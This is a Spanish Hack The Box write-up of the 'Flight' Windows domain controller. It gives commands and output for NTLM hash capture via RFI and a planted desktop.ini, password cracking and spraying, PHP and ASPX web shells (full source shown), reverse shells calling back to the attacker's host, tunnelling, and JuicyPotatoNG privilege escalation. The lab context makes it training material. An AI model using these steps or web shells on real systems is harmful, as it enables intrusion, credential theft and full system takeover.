---
title: Flight WriteUp
author: H4ckerLite 
date: 2023-03-24 00:00:00 +0800
categories: [hackthebox, machine, writeup]  
tags: [windows, hard, lfi, rfi, DC, virtual hosting, user pivoting, RunasCs.exe, JuicePotatoNG, web shell, Doma]
image:
  path: ../../assets/img/commons/Flight-writeup/Flight.png 
  alt: Flight WriteUp
pin: true
---
Bio

## Enumeración
### NMAP Scan

Realizando un NMAP Scan vemos.
```bash
❯ nmap 10.10.11.187
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-06 18:55 -04
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.80% done
Nmap scan report for 10.10.11.187
Host is up (0.15s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
```
Viendo los puertos **53** y **88** me indican que es un `DC`

Mirando el servidor vemos un dominio.
```bash
❯ curl -s 10.10.11.187 | html2text | tail -n3
Copyright 2022 flight.htb - All Rights Reserved
Designed by Geiseric & JDgodd
```

lo añadimos al `/etc/hosts`
```bash
❯ echo '10.10.11.187    flight.htb' | tee -a /etc/hosts
10.10.11.187    flight.htb
```
Al aplicar FUZZING no vemos nada interesante, buscamos subdominios


```bash
❯ gobuster vhost -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt  -t 300 -u flight.htb 2>/dev/null
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://flight.htb
[+] Method:       GET
[+] Threads:      300
[+] Wordlist:     /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2023/04/06 19:10:12 Starting gobuster in VHOST enumeration mode
===============================================================
Found: school.flight.htb (Status: 200) [Size: 3996]
===============================================================
2023/04/06 19:10:25 Finished
===============================================================
```
Lo añadimos al /etc/hosts....



Haciendo hovering sobre las pestañas vemos que lee el archivo por el parametro view?= 



![Hacker ]({{ 'assets/img/commons/Flight-writeup/1.png' | relative_url }}){: .center-image }
_Image_
## Intrusión
Esto huele a `LFI`, En lugar de intentar leer archivos podemos realizar un RFI a un servidor SMB loca, estó realizará una autenticación y nos mostrará el hash NTLMv2 del usuario que corre el servicio.

Nos creamos un servidor SMB con soporte para la versión 2.
```bash
❯ impacket-smbserver pwned  . -smb2support
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Mediante una petición obtendremos el Hash NTLMv2.
```bash
curl -s "http://school.flight.htb/?view=//10.10.14.97/pwned"
```
Y lo veremos frente a nuestros ojos.
```bash
❯ impacket-smbserver pwned  . -smb2support
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,52807)
[*] AUTHENTICATE_MESSAGE (flight\svc_apache,G0)
[*] User G0\svc_apache authenticated successfully
[*] svc_apache::flight:aaaaaaaaaaaaaaaa:62e323993fba7b01d7444bf4bdcc6c5b:01010000000000008075c293e368d901efb22a5fac2b3e9100000000010010004a00410054004e007800450056007600030010004a00410054004e0078004500560076000200100078005900700076006a0068006b0067000400100078005900700076006a0068006b006700070008008075c293e368d9010600040002000000080030003000000000000000000000000030000081294c43d7cd65ed148da6b446d86fa48a22e78a3c88765b131783f7454f633b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390037000000000000000000
[*] Closing down connection (10.10.11.187,52807)
[*] Remaining connections []
```

Lo copiamos en un fichero y lo intentamos crakear.
```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
S@Ss!K@*t13      (svc_apache)
1g 0:00:00:11 DONE (2023-04-06 19:59) 0.09041g/s 964189p/s 964189c/s 964189C/s SADSAM..S42150461
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Mediante crackmapexec podemos ver que son correctas.
```bash
❯ crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13'
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
```

Podemos intentar dumpear los usuarios.
```bash
❯ crackmapexec smb 10.10.11.187 -u svc_apache -p 'S@Ss!K@*t13' --users
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)
SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 baddpwdtime: 2023-04-07 07:01:10.196129+00:00
SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 baddpwdtime: 2023-04-06 12:17:59.474129+00:00
SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 2 baddpwdtime: 2023-04-06 12:41:47.520073+00:00
SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 baddpwdtime: 1601-01-01 00:00:00+00:00
SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 baddpwdtime: 2022-11-01 02:58:04.270580+00:00
```
Copiamos todos los usuarion y probaremos un ataque de fuerza bruta para ver si alguie reutiliza la contraseña.

- El archivo **users** cuenta con los nombres de usuario que se encuantra en disponible.
- el parametro **continue-on-success** nos permitira que ignore los matches y continue hasta terminar.

```bash
❯ crackmapexec smb 10.10.11.187 -u users -p 'S@Ss!K@*t13' --continue-on-success
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [-] flight.htb\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\svc_apache:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [-] flight.htb\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
SMB         10.10.11.187    445    G0               [-] flight.htb\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE 
```

El usuario `S.Moon` reutiliza la contraseña, pésima opción. Procedemos a ver sus directorios compartidos. Necesitamos uno en el cual podamos escribir.

```bash
❯ crackmapexec smb 10.10.11.187 -u S.Moon -p 'S@Ss!K@*t13' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\S.Moon:S@Ss!K@*t13 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ            
```

Nos conectamos por `smbclient` , pero........ no vemos nada, pero tenemos permiso de escritura.


```bash
❯ smbclient //10.10.11.187/Shared -U S.Moon --password 'S@Ss!K@*t13'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Apr  7 03:13:45 2023
  ..                                  D        0  Fri Apr  7 03:13:45 2023

		5056511 blocks of size 4096. 1174738 blocks available
smb: \> 
```


Creamos un archivo malicioso `desktop.ini` siguiendo la guía de [HackTricks](https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds#desktop.ini).
```bash
❯ echo '[.ShellClassInfo]' > desktop.ini
❯ echo IconResource=\\10.10.14.97\pwned >> desktop.ini
```
Creamos otro servidor smb....
```bash
❯ impacket-smbserver pwned  . -smb2support
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Subimos nuestro archivo malicioso
```bash
smb: \> put desktop.ini
putting file desktop.ini as \desktop.ini (0,1 kb/s) (average 0,1 kb/s)
smb: \> 
```

Esperamos unos minutos hasta que el usuario haga click en el archivo y nos llegará el hash `NTLMv2`
```bash
❯ impacket-smbserver pwned  . -smb2support
Impacket v0.10.1.dev1+20230120.195338.34229464 - Copyright 2022 Fortra

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.187,52884)
[*] AUTHENTICATE_MESSAGE (flight.htb\c.bum,G0)
[*] User G0\c.bum authenticated successfully
[*] c.bum::flight.htb:aaaaaaaaaaaaaaaa:0655e313d46e69ab9af3c1b5f235a237:01010000000000000071af45e768d90189f5ed66e4153edb00000000010010004e006d006900720051004d004b004300030010004e006d006900720051004d004b00430002001000510055006800770069004d004f004d0004001000510055006800770069004d004f004d00070008000071af45e768d9010600040002000000080030003000000000000000000000000030000081294c43d7cd65ed148da6b446d86fa48a22e78a3c88765b131783f7454f633b0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00390037000000000000000000
[*] Closing down connection (10.10.11.187,52884)
[*] Remaining connections []
```

Volvemos a crakearlo.

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)
1g 0:00:00:07 DONE (2023-04-06 20:25) 0.1270g/s 1338Kp/s 1338Kc/s 1338KC/s TinyMutt69..Tiffani29
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```
Conseguimos la contraseña de `C.Bum`. Listamos si tenemos un recurso con permiso de escritura.

```bash
❯ crackmapexec smb 10.10.11.187 -u C.Bum -p 'Tikkycoll_431012284' --shares
SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.187    445    G0               [+] flight.htb\C.Bum:Tikkycoll_431012284 
SMB         10.10.11.187    445    G0               [+] Enumerated shares
SMB         10.10.11.187    445    G0               Share           Permissions     Remark
SMB         10.10.11.187    445    G0               -----           -----------     ------
SMB         10.10.11.187    445    G0               ADMIN$                          Remote Admin
SMB         10.10.11.187    445    G0               C$                              Default share
SMB         10.10.11.187    445    G0               IPC$            READ            Remote IPC
SMB         10.10.11.187    445    G0               NETLOGON        READ            Logon server share 
SMB         10.10.11.187    445    G0               Shared          READ,WRITE      
SMB         10.10.11.187    445    G0               SYSVOL          READ            Logon server share 
SMB         10.10.11.187    445    G0               Users           READ            
SMB         10.10.11.187    445    G0               Web             READ,WRITE      
```

Vemos que en `Shares` y en `Web`, entramos con `smbclient`.
```bash
❯ smbclient //10.10.11.187/Web -U C.Bum --password 'Tikkycoll_431012284'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Fri Apr  7 03:29:21 2023
  ..                                  D        0  Fri Apr  7 03:29:21 2023
  flight.htb                          D        0  Fri Apr  7 03:27:01 2023
  school.flight.htb                   D        0  Fri Apr  7 03:27:01 2023

		5056511 blocks of size 4096. 1174531 blocks available
smb: \> 
```
Subimos una `WebShell.php` podemos usar [esta](https://github.com/WhiteWinterWolf/wwwolf-php-webshell).
| Nota: Es posble que tengas que subir mas de una, ya que al cabo de unos segundos se elimina.
```bash
smb: \> cd flight.htb\
smb: \flight.htb\> put webshell.php
putting file webshell.php as \flight.htb\webshell.php (15,5 kb/s) (average 10,3 kb/s)
smb: \flight.htb\> 
```
Abrimos la `WebShell`....
![Hacker ]({{ 'assets/img/commons/Flight-writeup/2.png' | relative_url }}){: .center-image }
_Web Shell_

Creamos una carpeta en `C:\`....
![Hacker ]({{ 'assets/img/commons/Flight-writeup/3.png' | relative_url }}){: .center-image }
_Web Shell_

Procedemos a descargar [netcat](https://github.com/int0x33/nc.exe/), pero primero creamos un servidor python
```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
![Hacker ]({{ 'assets/img/commons/Flight-writeup/4.png' | relative_url }}){: .center-image }
_Web SHell_

Ahora lo ejecutamos..

![Hacker ]({{ 'assets/img/commons/Flight-writeup/5.png' | relative_url }}){: .center-image }
_Web SHell_

Como vemos nos llega la shell.
```bash
❯ rlwrap nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.10.11.187] 53036
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\xampp\htdocs\flight.htb> 
```
Pero somos `svc_apache`.
```bash
PS C:\xampp\htdocs\flight.htb> whoami
whoami
flight\svc_apache
PS C:\xampp\htdocs\flight.htb> 
```
## Movimientos laterales
Tenemos la contraseña de `C.Bum` podemos probarlas con `RunasCs.exe`, la descargamos de [aquí](https://github.com/antonioCoco/RunasCs/releases).



> **By ChatGPT:** "RunasCs.exe" es un archivo ejecutable que se utiliza para iniciar una aplicación de consola de Windows con privilegios elevados. La herramienta "runas" se usa para ejecutar programas con permisos de administrador o de otro usuario en Windows. "RunasCs.exe" es una versión personalizada de la herramienta "runas" que puede ejecutar scripts de PowerShell desde una consola de Windows con permisos elevados.

>En resumen, "RunasCs.exe" es un archivo ejecutable que se utiliza para ejecutar aplicaciones con permisos elevados en una consola de Windows y, en particular, es útil para ejecutar scripts de PowerShell con permisos de administrador o de otro usuario. Es importante tener cuidado al usar esta herramienta y solo ejecutar archivos de fuentes confiables, ya que puede ser potencialmente peligroso si se usa incorrectamente.

Ya saben.

- servidor python

Descargamos el archivo...


```bash
PS C:\xampp\htdocs\flight.htb> curl 10.10.14.97/RunasCs.exe -o RunasCs.exe
curl 10.10.14.97/RunasCs.exe -o RunasCs.exe
PS C:\xampp\htdocs\flight.htb> 
```

Nos ponemos en escucha de nuevo.

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
```

Y ejecutamos.....

```bash
PS C:\xampp\htdocs\flight.htb> .\RunasCs.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.14.97:443
.\RunasCs.exe C.Bum Tikkycoll_431012284 powershell -r 10.10.14.97:443
[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-5cb14$\Default
[+] Async process 'powershell' with pid 3692 created and left in background.
PS C:\xampp\htdocs\flight.htb> 
```


Ahora recibimos la shell como `C.Bum`. 
```bash
PS C:\Windows\system32> whoami
whoami
flight\c.bum
PS C:\Windows\system32> 
```
Procedemos a leer la primera flag.

```bash
PS C:\Windows\system32> type C:\Users\C.Bum\Desktop\user.txt
type C:\Users\C.Bum\Desktop\user.txt
87****************************1c
PS C:\Windows\system32> 
```

![Hacker ]({{ 'assets/img/commons/broScience-writeup/roblox.gif' | relative_url }}){: .center-image }
_PWNED!!!_


## Escalada de privilegios

Viendo puertos abiertos vemos este puerto.
```bash
PS C:\Windows\system32> netstat -oat
netstat -oat

Active Connections

  Proto  Local Address          Foreign Address        State           PID      Offload State

  TCP    0.0.0.0:80             g0:0                   LISTENING       4752	InHost      
  TCP    0.0.0.0:88             g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:135            g0:0                   LISTENING       920	InHost      
  TCP    0.0.0.0:389            g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:443            g0:0                   LISTENING       4752	InHost      
  TCP    0.0.0.0:445            g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:464            g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:593            g0:0                   LISTENING       920	InHost      
  TCP    0.0.0.0:636            g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:3268           g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:3269           g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:5985           g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:8000           g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:9389           g0:0                   LISTENING       2744	InHost      
  TCP    0.0.0.0:47001          g0:0                   LISTENING       4	InHost      
  TCP    0.0.0.0:49664          g0:0                   LISTENING       504	InHost      
  TCP    0.0.0.0:49665          g0:0                   LISTENING       1096	InHost      
  TCP    0.0.0.0:49666          g0:0                   LISTENING       1508	InHost      
  TCP    0.0.0.0:49667          g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:49673          g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:49674          g0:0                   LISTENING       652	InHost      
  TCP    0.0.0.0:49682          g0:0                   LISTENING       644	InHost      
  TCP    0.0.0.0:49694          g0:0                   LISTENING       2908	InHost      
  TCP    0.0.0.0:49723          g0:0                   LISTENING       2852	InHost      
  TCP    10.10.11.187:53        g0:0                   LISTENING       2908	InHost     
```


>Usando [chisel](https://github.com/jpillora/chisel/releases) haremos port forwarding.

En nuestra máquina ejecutamos como  server.
```bash
❯ ./chisel server --reverse --port 9000
2023/04/06 22:30:23 server: Reverse tunnelling enabled
2023/04/06 22:30:23 server: Fingerprint LGzxnAs5dUDkv0yw4j1oqcFpt3BfrUxc2Ohet8a6KWM=
2023/04/06 22:30:23 server: Listening on http://0.0.0.0:9000

```
Lo descargamos en Windows.
```bash
PS C:\Windows\system32> cd C:\SxZkD
cd C:\SxZkD
PS C:\SxZkD> curl 10.10.14.97/chisel.exe -o chisel.exe
curl 10.10.14.97/chisel.exe -o chisel.exe
PS C:\SxZkD> ls
ls


    Directory: C:\SxZkD


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         4/7/2023   2:28 AM        8676864 chisel.exe                                                            
-a----         4/7/2023   1:06 AM          45272 nc.exe                                                                


PS C:\SxZkD>
```

En la máquina `Windows` lo ejecutamos como cliente.
```bash
PS C:\SxZkD> .\chisel.exe client 10.10.14.97:9000 R:8000:127.0.0.1:8000
.\chisel.exe client 10.10.14.97:9000 R:8000:127.0.0.1:8000
```
No damos cuanta que la web está hecha con ASP.NET, así que podemos subir una reverse shell `.aspx`.



Si miramos la raiz de la carpeta veremos.....

```bash
PS C:\Windows\system32> cd ../..
cd ../..
PS C:\> ls
ls


    Directory: C:\


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----         4/7/2023   2:07 AM                inetpub                                                               
d-----         6/7/2022   6:39 AM                PerfLogs                                                              
d-r---       10/21/2022  11:49 AM                Program Files                                                         
d-----        7/20/2021  12:23 PM                Program Files (x86)                                                   
d-----         4/7/2023  12:29 AM                Shared                                                                
d-----        9/22/2022  12:28 PM                StorageReports                                                        
d-----         4/7/2023   1:06 AM                SxZkD                                                                 
d-r---        9/22/2022   1:16 PM                Users                                                                 
d-----       10/21/2022  11:52 AM                Windows                                                               
d-----        9/22/2022   1:16 PM                xampp                                                                 


PS C:\> 
```
La carpeta `inetpub` no es casual, veremos su contenido.

```bash
PS C:\> cd inetpub
cd inetpub
PS C:\inetpub> dir
dir


    Directory: C:\inetpub


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----        9/22/2022  12:24 PM                custerr                                                               
d-----         4/7/2023   2:12 AM                development                                                           
d-----        9/22/2022   1:08 PM                history                                                               
d-----        9/22/2022  12:32 PM                logs                                                                  
d-----        9/22/2022  12:24 PM                temp                                                                  
d-----        9/22/2022  12:28 PM                wwwroot                                                               


PS C:\inetpub> cd development
cd development
PS C:\inetpub\development> 
```

Usando este repo crearemos nuestra [cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)
>Aquí te lo comparto.

```bash
<%@ Page Language="VB" Debug="true" %>
<%@ import Namespace="system.IO" %>
<%@ import Namespace="System.Diagnostics" %>

<script runat="server">      
Sub RunCmd(Src As Object, E As EventArgs)            
  Dim myProcess As New Process()            
  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            
  myProcessStartInfo.UseShellExecute = false            
  myProcessStartInfo.RedirectStandardOutput = true            
  myProcess.StartInfo = myProcessStartInfo            
  myProcessStartInfo.Arguments=xcmd.text            
  myProcess.Start()            
  Dim myStreamReader As StreamReader = myProcess.StandardOutput            
  Dim myString As String = myStreamReader.Readtoend()            
  myProcess.Close()            
  mystring=replace(mystring,"<","&lt;")            
  mystring=replace(mystring,">","&gt;")            
  result.text= vbcrlf & "<pre>" & mystring & "</pre>"    
End Sub
</script>

<html>
<body>    
<form runat="server">        
<p><asp:Label id="L_p" runat="server" width="80px">Program</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        
<p><asp:Label id="L_a" runat="server" width="80px">Arguments</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user">/c net user</asp:TextBox>        
<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        
<p><asp:Label id="result" runat="server"></asp:Label>       
</form>
</body>
</html>
```

Lo descargamos...
```bash
PS C:\inetpub\development> curl 10.10.14.97/cmd.aspx -o cmd.aspx
curl 10.10.14.97/cmd.aspx -o cmd.aspx
PS C:\inetpub\development> 
```
![Hacker ]({{ 'assets/img/commons/Flight-writeup/6.png' | relative_url }}){: .center-image }
_CMD.aspx_

Nos enviamos una shell con netcat.

![Hacker ]({{ 'assets/img/commons/Flight-writeup/7.png' | relative_url }}){: .center-image }
_Reverse Shell_

Nos ponemos en escucha y nos llega la shell.

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.97] from (UNKNOWN) [10.10.11.187] 53554
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> 
```
Si listamos nuiestros privilegios veremos.
```bash
PS C:\windows\system32\inetsrv> whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeMachineAccountPrivilege     Add workstations to domain                Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> 
```

El privilegio `SeImpersonatePrivilege` nos llama la atención. Usando [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG). Lo descargamos

```bash
PS C:\SxZkD> curl 10.10.14.97/JuicyPotatoNG.exe -o JP.exe
curl 10.10.14.97/JuicyPotatoNG.exe -o JP.exe
PS C:\SxZkD> 
```

Cuando lo ejecutemos le decimos que nos otorgue una `cmd` y entrar en modo interactivo.

```bash
.\JP.exe -t * -p "C:\Windows\System32\cmd.exe" -i
```
¿Estan listo?
```bash
PS C:\SxZkD> .\JP.exe -t * -p "C:\Windows\System32\cmd.exe" -i
.\JP.exe -t * -p "C:\Windows\System32\cmd.exe" -i
Microsoft Windows [Version 10.0.17763.2989]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\>
```

```bash

C:\>whoami
whoami
nt authority\system

C:\>

```
Procedemos a leer la flag.

```bash
C:\>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
97****************************fb

C:\>
```
![Hacker ]({{ 'assets/img/commons/escape-writeup/hacker.gif' | relative_url }}){: .center-image }
_PWNED_
¿Qué te parecio?